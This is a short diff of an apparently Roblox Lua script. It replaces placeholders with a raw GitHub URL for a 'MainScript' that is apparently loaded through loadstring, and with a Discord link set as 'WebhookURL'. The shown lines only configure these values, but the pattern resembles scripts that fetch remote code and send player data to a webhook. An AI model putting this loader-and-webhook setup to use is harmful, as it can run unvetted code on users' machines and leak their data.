@@ -6,8 +6,8 @@ local WhitelistedNames = {
     " ",
 }
 
-local MainScript = "script loadstring "
-local WebhookURL = "webhook link "
+local MainScript = "https://raw.githubusercontent.com/bacsainluis-hub/my-script-/refs/heads/main/private%20%20HAHAHA "
+local WebhookURL = "https://discord.gg/bxbSvg35Q "
 -- [[ 2. FORMATTER FUNCTION ]]
 local function FormatNumber(value)
     if not value or value == "N/A" then return "0" end
